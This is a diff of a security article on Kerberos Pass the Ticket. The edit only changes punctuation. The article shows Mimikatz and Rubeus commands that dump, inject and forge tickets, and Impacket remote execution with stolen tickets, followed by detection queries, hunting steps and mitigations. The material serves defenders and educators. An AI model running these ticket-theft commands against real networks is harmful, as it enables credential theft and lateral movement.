@@ -18,7 +18,7 @@ featured: false
 
 ## Definition
 
-Pass the Ticket (PtT) is a lateral movement technique that steals valid Kerberos tickets from memory on a compromised machine and injects them into a different session to authenticate as the ticket's original owner — without knowing the user's password, hash, or any other credential.
+Pass the Ticket (PtT) is a lateral movement technique that steals valid Kerberos tickets from memory on a compromised machine and injects them into a different session to authenticate as the ticket's original owner, without knowing the user's password, hash, or any other credential.
 
 Unlike Pass the Hash (which abuses NTLM), PtT operates entirely within the Kerberos protocol. The stolen ticket is cryptographically valid because it was issued by the KDC. The domain controller cannot distinguish it from legitimate use.
 
@@ -30,7 +30,7 @@ Unlike Pass the Hash (which abuses NTLM), PtT operates entirely within the Kerbe
 
 **Ticket Granting Ticket (TGT)**
 - Issued by the KDC (AS-REP) during initial authentication
-- Encrypted with the krbtgt account's hash — only the KDC can read it
+- Encrypted with the krbtgt account's hash, only the KDC can read it
 - Proves to the KDC that the user has authenticated
 - Used to request TGS (service tickets) without re-entering a password
 - Default validity: 10 hours; renewable up to 7 days
@@ -43,7 +43,7 @@ Unlike Pass the Hash (which abuses NTLM), PtT operates entirely within the Kerbe
 
 ### Where Tickets Live in Memory
 
-Kerberos tickets are stored in the **Kerberos Credential Cache** inside LSASS memory, organized by **LUID** (Locally Unique Identifier — the logon session ID). Each LUID corresponds to a logon session.
+Kerberos tickets are stored in the **Kerberos Credential Cache** inside LSASS memory, organized by **LUID** (Locally Unique Identifier, the logon session ID). Each LUID corresponds to a logon session.
 
 ```
 LUID 0x3e7 = SYSTEM session (machine account TGT)
@@ -60,7 +60,7 @@ Tickets are stored in the MIT Kerberos credential cache format (`.ccache` on Lin
 
 ## How an Attacker Performs This Attack
 
-### Phase 1 — Identify Valuable Sessions
+### Phase 1, Identify Valuable Sessions
 
 ```cmd
 # List all cached tickets in the current session
@@ -71,24 +71,24 @@ klist sessions
 ```
 
 ```powershell
-# Rubeus — enumerate all tickets across all sessions
+# Rubeus, enumerate all tickets across all sessions
 .\Rubeus.exe klist
 
 # Show ticket details for a specific LUID
 .\Rubeus.exe klist /luid:0x1234ab
 ```
 
-### Phase 2 — Extract Tickets
+### Phase 2, Extract Tickets
 
 ```cmd
-# Mimikatz — export all tickets to .kirbi files
+# Mimikatz, export all tickets to .kirbi files
 privilege::debug
 sekurlsa::tickets /export
 # Creates: [LUID]-[KeyType]-[ServiceName]@[RealmName].kirbi
 ```
 
 ```powershell
-# Rubeus — dump all tickets as base64
+# Rubeus, dump all tickets as base64
 .\Rubeus.exe dump /nowrap
 
 # Dump tickets for a specific service
@@ -99,15 +99,15 @@ sekurlsa::tickets /export
 ```
 
 ```bash
-# From Linux — if you already have a CCACHE file (e.g., from secretsdump)
+# From Linux, if you already have a CCACHE file (e.g., from secretsdump)
 export KRB5CCNAME=/tmp/admin.ccache
 python3 getTGT.py domain.local/administrator -hashes :NTLMHASH -dc-ip 192.168.1.10
 ```
 
-### Phase 3 — Inject and Use
+### Phase 3, Inject and Use
 
 ```cmd
-# Mimikatz — inject a .kirbi ticket into current session
+# Mimikatz, inject a .kirbi ticket into current session
 kerberos::ptt C:\Temp\tickets\[1234ab]-2-4-administrator@krbtgt~DOMAIN.LOCAL@DOMAIN.LOCAL.kirbi
 
 # Inject multiple tickets at once
@@ -118,16 +118,16 @@ klist   # should show the injected ticket
 ```
 
 ```powershell
-# Rubeus — inject base64 ticket
+# Rubeus, inject base64 ticket
 .\Rubeus.exe ptt /ticket:<base64_ticket_string>
 
-# Rubeus — createnetonly to spawn an isolated process with the ticket
+# Rubeus, createnetonly to spawn an isolated process with the ticket
 .\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:domain.local \
   /username:administrator /password:FakePass /ticket:<base64_ticket>
 ```
 
 ```bash
-# Linux — set CCACHE and use Impacket tools
+# Linux, set CCACHE and use Impacket tools
 export KRB5CCNAME=/tmp/administrator.ccache
 python3 psexec.py   -k -no-pass domain.local/administrator@targetserver.domain.local
 python3 wmiexec.py  -k -no-pass domain.local/administrator@targetserver.domain.local
@@ -139,7 +139,7 @@ python3 smbclient.py -k -no-pass domain.local/administrator@targetserver.domain.
 A related technique: if you have an NTLM hash but want a Kerberos ticket instead (to avoid NTLM-based detection), you can exchange the hash for a TGT:
 
 ```cmd
-# Mimikatz — overpass the hash (create a TGT from an NTLM hash)
+# Mimikatz, overpass the hash (create a TGT from an NTLM hash)
 sekurlsa::pth /user:administrator /domain:domain.local \
   /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:powershell.exe
 # In the new process:
@@ -147,7 +147,7 @@ klist   # TGT is now present
 ```
 
 ```powershell
-# Rubeus — overpass the hash
+# Rubeus, overpass the hash
 .\Rubeus.exe asktgt /user:administrator /rc4:8846f7eaee8fb117ad06bdd830b7586c /ptt
 .\Rubeus.exe asktgt /user:administrator /aes256:<AES256_KEY> /ptt  # preferred
 ```
@@ -158,7 +158,7 @@ klist   # TGT is now present
 
 **1. Ticket validity window is long.** A stolen TGT gives 10 hours of unrestricted access to request any service ticket. With renewal, an attacker can keep a stolen TGT alive for 7 days without reauthenticating.
 
-**2. The KDC validates the ticket — not the session origin.** The KDC has no concept of "which machine issued this authentication". A ticket extracted on workstation A and injected on a Linux host is treated as valid.
+**2. The KDC validates the ticket, not the session origin.** The KDC has no concept of "which machine issued this authentication". A ticket extracted on workstation A and injected on a Linux host is treated as valid.
 
 **3. No password involved.** Password changes, resets, or expiry do not invalidate in-flight tickets. Only rotating the krbtgt account (Golden Ticket) or the service account password (Silver Ticket) invalidates tickets.
 
@@ -218,7 +218,7 @@ Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4770 } |
 ### `.kirbi` File Creation Detection
 
 ```powershell
-# Sysmon Event 11 — File Creation
+# Sysmon Event 11, File Creation
 Get-WinEvent -FilterHashtable @{
   LogName = 'Microsoft-Windows-Sysmon/Operational'; Id = 11
 } | Where-Object {
@@ -232,7 +232,7 @@ Get-WinEvent -FilterHashtable @{
 ### Detect Rubeus / Mimikatz by Command Line
 
 ```powershell
-# Sysmon Event 1 — Process Create
+# Sysmon Event 1, Process Create
 Get-WinEvent -FilterHashtable @{
   LogName = 'Microsoft-Windows-Sysmon/Operational'; Id = 1
 } | Where-Object {
@@ -266,7 +266,7 @@ Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4769 } |
 
 ## How to Hunt It (Post-Incident)
 
-### Phase 1 — Audit all active and recent ticket requests
+### Phase 1, Audit all active and recent ticket requests
 
 ```powershell
 $start = (Get-Date).AddDays(-7)
@@ -293,9 +293,9 @@ foreach ($dc in $dcs) {
 }
 ```
 
-### Phase 2 — Identify sessions with abnormal ticket lifetime
+### Phase 2, Identify sessions with abnormal ticket lifetime
 
-A stolen ticket used post-expiry won't work — but a ticket with an unusually long remaining lifetime at the time of a suspicious logon may indicate a forged or pre-staged ticket.
+A stolen ticket used post-expiry won't work, but a ticket with an unusually long remaining lifetime at the time of a suspicious logon may indicate a forged or pre-staged ticket.
 
 ---
 
@@ -312,7 +312,7 @@ Group Policy: Computer Configuration → Windows Settings → Security Settings 
 - Maximum lifetime for service ticket: 60 minutes (default 600)
 ```
 
-### 2. Credential Guard — Protect the Ticket Store
+### 2. Credential Guard, Protect the Ticket Store
 
 Credential Guard moves the Kerberos ticket store into VSM (Virtual Secure Mode). Processes running in the normal OS cannot read it.
 
@@ -321,7 +321,7 @@ Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
   -Name "LsaCfgFlags" -Value 1 -Type DWord
 ```
 
-### 3. Protected Users — Prevent Ticket Caching
+### 3. Protected Users, Prevent Ticket Caching
 
 Protected Users group members do not have their TGTs cached on disk or renewed automatically. Their TGT expires in 4 hours (non-renewable).
 
@@ -329,13 +329,13 @@ Protected Users group members do not have their TGTs cached on disk or renewed a
 Add-ADGroupMember -Identity "Protected Users" -Members "DomainAdmin1"
 ```
 
-### 4. Tiered Administration — Prevent TGT Exposure
+### 4. Tiered Administration, Prevent TGT Exposure
 
 The root cause of PtT is privileged accounts logging onto unprivileged machines. Enforce PAW (Privileged Access Workstations) and the Tier 0/1/2 model:
 
-- **Tier 0**: Domain Controllers, ADCS, AAD Connect — only Tier 0 admins log here
-- **Tier 1**: Servers — only Tier 1 admins log here
-- **Tier 2**: Workstations — only helpdesk, not domain admins
+- **Tier 0**: Domain Controllers, ADCS, AAD Connect, only Tier 0 admins log here
+- **Tier 1**: Servers, only Tier 1 admins log here
+- **Tier 2**: Workstations, only helpdesk, not domain admins
 
 ```powershell
 # Enforce via GPO: Deny log on locally / Deny log on through Remote Desktop Services
@@ -356,4 +356,4 @@ Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
 
 ## Conclusion
 
-Pass the Ticket is the natural evolution of credential theft when Kerberos replaces NTLM. The ticket is as valid as the original logon — the KDC has no mechanism to revoke it during its lifetime. Defense converges on two things: keeping privileged tickets away from non-privileged machines (tiered administration, PAWs), and detecting the behavioral impossibility of simultaneous logons from different sources. Detection without a behavioral baseline is blind — measure first, alert second.
+Pass the Ticket is the natural evolution of credential theft when Kerberos replaces NTLM. The ticket is as valid as the original logon, the KDC has no mechanism to revoke it during its lifetime. Defense converges on two things: keeping privileged tickets away from non-privileged machines (tiered administration, PAWs), and detecting the behavioral impossibility of simultaneous logons from different sources. Detection without a behavioral baseline is blind, measure first, alert second.
